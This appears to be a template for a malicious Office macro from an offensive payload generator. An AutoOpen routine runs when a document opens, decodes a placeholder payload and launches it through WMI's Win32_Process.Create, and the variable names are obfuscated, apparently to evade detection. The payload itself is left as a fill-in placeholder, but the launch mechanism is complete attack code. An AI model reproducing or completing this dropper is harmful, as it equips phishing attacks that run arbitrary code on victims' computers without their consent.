[use:payload_wrapper]
[use:exec]
[use:init_wmi]

Sub AutoOpen()
	Dim var1 As String
	Dim var2 As Object
	Dim var3 As Integer
	Dim var4 As String
	Dim var5 as String
	
	var3 = [int1]
	var5 = init_wmi("data1")
	Set var2 = GetObject(var5)
	var4 = payload_wrapper("data1")
	var4 = exec(var2, var4, var3)
End Sub

Function payload_wrapper(payload_wrapper1 As String) As String
	Dim payload_wrapper2 As String
	[payload]
	payload_wrapper2 = [payload_args]
	payload_wrapper2 = decode(payload_wrapper2)
	payload_wrapper = payload_wrapper2
End Function

Function exec(exec1 As Object, exec2 As String, exec3 As Integer) As String
	Dim exec4 As String
	Dim exec5 As Integer
	exec5 = [smallint1]
	exec4 = exec2
    If (exec3 > exec5) Then
		exec5 = exec3 - exec3
		exec1.Create(exec4)
	End If
	exec4 = "exec6"
	exec = exec4
End Function

Function init_wmi(init_wmi1 As String) As String
	Dim init_wmi2 As String
	init_wmi2 = decode("{[winmgmts:Win32_Process]}")
    init_wmi = init_wmi2
End Function
